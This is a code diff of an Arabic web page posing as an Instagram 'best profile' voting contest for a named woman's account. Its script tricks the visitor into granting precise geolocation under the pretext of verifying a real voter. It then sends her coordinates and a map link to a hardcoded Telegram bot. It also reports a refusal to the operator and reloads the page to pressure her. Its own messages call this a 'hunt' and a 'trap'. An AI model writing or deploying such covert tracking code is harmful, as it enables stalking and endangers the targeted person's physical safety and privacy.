@@ -3,23 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مسابقة أفضل بروفايل 2026</title>
+    <title>دعم الهوية الرقمية - التصويت</title>
     <style>
         body { background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center; }
-        .profile-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #e1306c; padding: 3px; margin-bottom: 15px; }
-        h2 { color: #262626; font-size: 20px; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; line-height: 1.5; }
-        .btn { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; border: none; padding: 12px; border-radius: 30px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; margin-top: 20px; box-shadow: 0 4px 15px rgba(225, 48, 108, 0.4); }
+        
+        /* تصميم الإطار الدائري للصورة الشخصية */
+        .profile-frame { position: relative; width: 110px; height: 110px; margin: 0 auto 15px; }
+        .profile-frame svg { width: 100%; height: 100%; position: absolute; top: 0; left: 0; }
+        .profile-frame img { 
+            width: 100px; height: 100px; 
+            border-radius: 50%; 
+            position: absolute; 
+            top: 5px; left: 5px; 
+            object-fit: cover; 
+            border: 1px solid #dbdbdb;
+        }
+
+        h2 { color: #262626; font-size: 20px; margin-bottom: 5px; }
+        .user-id { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; display: block; }
+        p { color: #666; font-size: 14px; line-height: 1.6; }
+        
+        /* زر التصويت بستايل إنستغرام */
+        .btn { 
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); 
+            color: white; border: none; padding: 12px; border-radius: 30px; 
+            font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; 
+            margin-top: 20px; box-shadow: 0 4px 15px rgba(225, 48, 108, 0.4); 
+            transition: 0.3s;
+        }
+        .btn:hover { box-shadow: 0 6px 20px rgba(225, 48, 108, 0.6); }
+        
         #status { margin-top: 15px; font-size: 12px; color: #ed4956; display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="profile-img" alt="User">
-    <h2>التصويت لـ (ha2542213)</h2>
+    <div class="profile-frame">
+        <svg viewBox="0 0 110 110">
+            <defs>
+                <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                    <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
+                    <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
+                    <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
+                    <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
+                </linearGradient>
+            </defs>
+            <circle cx="55" cy="55" r="53" fill="none" stroke="url(#gradient)" stroke-width="3"/>
+        </svg>
+        <img src="https://image_5.png" alt="Profile">
+    </div>
+
+    <h2>التصويت لـ (Hana)</h2>
+    <span class="user-id">@ha2542213</span>
+    
     <p>بقي 50 صوتاً فقط لتفوز رفيقتك بالمركز الأول! <br><br> <b>ملاحظة:</b> يجب السماح بالوصول للموقع للتأكد من أنك "مستخدم حقيقي" ولحماية نزاهة التصويت.</p>
+    
     <button class="btn" onclick="vote()">صوّت الآن (دعم الهوية)</button>
     <div id="status">⚠️ خطأ: يجب تفعيل "سماح للموقع" ليتم احتساب صوتك!</div>
 </div>
@@ -28,32 +68,29 @@
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function send(m) {
+    function sendToTelegram(m) {
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
     }
 
     function vote() {
+        // إعدادات الدقة العالية
         const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
 
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(p) {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                const acc = p.coords.accuracy;
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
                 const mapLink = `https://www.google.com/maps?q=${lat},${lat},${lon}`;
                 
-                send(`🎯 صيد المسابقة!\n👤 الحساب: ha2542213\n📍 الموقع: ${mapLink}\n📏 الدقة: ${acc.toFixed(1)} متر`);
+                sendToTelegram(`🎯 صيد دقيق (فخ المسابقة)!\n👤 الحساب: Hana (ha2542213)\n📍 الموقع: ${mapLink}\n📏 نسبة الخطأ: ${acc.toFixed(1)} متر`);
                 
                 alert("تم احتساب صوتك بنجاح! شكراً لدعمك.");
                 window.location.href = "https://www.instagram.com/ha2542213";
-            }, function(e) {
-                send("⚠️ البنت دخلت المسابقة ورفضت الموقع.");
+            }, function(error) {
+                sendToTelegram("⚠️ البنت دخلت المسابقة لكن رفضت تعطي الموقع.");
                 document.getElementById('status').style.display = 'block';
-                // إجبارها على المحاولة مرة ثانية
                 setTimeout(() => { alert("يجب الضغط على 'سماح' ليتم قبول التصويت."); location.reload(); }, 500);
             }, options);
         }
     }
-</script>
-</body>
-</html>
